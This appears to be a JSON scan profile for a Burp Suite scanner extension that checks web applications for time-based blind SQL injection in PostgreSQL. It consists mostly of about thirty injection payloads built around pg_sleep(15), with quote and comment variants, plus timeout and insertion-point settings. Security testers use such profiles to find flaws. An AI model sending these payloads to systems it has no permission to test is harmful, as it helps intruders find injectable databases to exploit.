[
  {
    "ProfileName": "BlindSQLi - PostgreSQL - TimeBased",
    "Name": "",
    "Enabled": true,
    "Scanner": 1,
    "Author": "@egarme",
    "Payloads": [
      "true,\";SELECT pg_sleep(15);",
      "true,;SELECT pg_sleep(15);",
      "true,and SELECT pg_sleep(15);",
      "true,1 SELECT pg_sleep(15);",
      "true,or SELECT pg_sleep(15);",
      "true,(SELECT pg_sleep(15))",
      "true,pg_sleep(15)--",
      "true,1 or pg_sleep(15)--",
      "true,\" or pg_sleep(15)--",
      "true,\u0027 or pg_sleep(15)--",
      "true,1) or pg_sleep(15)--",
      "true,\") or pg_sleep(15)--",
      "true,\u0027) or pg_sleep(15)--",
      "true,1)) or pg_sleep(15)--",
      "true,\")) or pg_sleep(15)--",
      "true,\u0027)) or pg_sleep(15)--",
      "true,pg_SLEEP(15)",
      "true,pg_SLEEP(15)--",
      "true,pg_SLEEP(15)#",
      "true,or pg_SLEEP(15)",
      "true,or pg_SLEEP(15)--",
      "true,or pg_SLEEP(15)#",
      "true,\u0027 SELECT pg_sleep(15);",
      "true,1 AND 1337\u003d(SELECT 1337 FROM PG_SLEEP(15))",
      "true,1 AND 1337\u003d(SELECT 1337 FROM PG_SLEEP(15))-- 1337",
      "true,1\u0027 AND 1337\u003d(SELECT 1337 FROM PG_SLEEP(15)) AND \u00271337\u0027\u003d\u00271337",
      "true,1\u0027) AND 1337\u003d(SELECT 1337 FROM PG_SLEEP(15)) AND (\u00271337\u0027\u003d\u00271337",
      "true,1) AND 1337\u003d(SELECT 1337 FROM PG_SLEEP(15)) AND (1337\u003d1337",
      "true,or pg_sleep(15)--",
      "true,) or pg_sleep(15)--",
      "true,)) or pg_sleep(15)--"
    ],
    "Encoder": [
      "URL-encode key characters"
    ],
    "UrlEncode": false,
    "CharsToUrlEncode": "",
    "Grep": [],
    "Tags": [
      "SQLi",
      "All"
    ],
    "PayloadResponse": false,
    "NotResponse": false,
    "TimeOut1": "14",
    "TimeOut2": "20",
    "isTime": false,
    "contentLength": "",
    "iscontentLength": false,
    "CaseSensitive": false,
    "ExcludeHTTP": false,
    "OnlyHTTP": false,
    "IsContentType": false,
    "ContentType": "",
    "HttpResponseCode": "",
    "NegativeCT": false,
    "IsResponseCode": false,
    "ResponseCode": "",
    "NegativeRC": false,
    "urlextension": "",
    "isurlextension": false,
    "NegativeUrlExtension": false,
    "MatchType": 5,
    "Scope": 0,
    "RedirType": 0,
    "MaxRedir": 0,
    "payloadPosition": 2,
    "payloadsFile": "",
    "grepsFile": "",
    "IssueName": "BlindSQLi - PostgreSQL - TimeBased",
    "IssueSeverity": "High",
    "IssueConfidence": "Certain",
    "IssueDetail": "",
    "RemediationDetail": "",
    "IssueBackground": "",
    "RemediationBackground": "",
    "Header": [],
    "VariationAttributes": [],
    "InsertionPointType": [
      18,
      65,
      32,
      36,
      7,
      1,
      2,
      6,
      33,
      5,
      35,
      34,
      64,
      0,
      3,
      4,
      37,
      127,
      65,
      32,
      36,
      7,
      1,
      2,
      6,
      33,
      5,
      35,
      34,
      64,
      0,
      3,
      4,
      37,
      127
    ],
    "Scanas": false,
    "Scantype": 0,
    "pathDiscovery": false
  }
]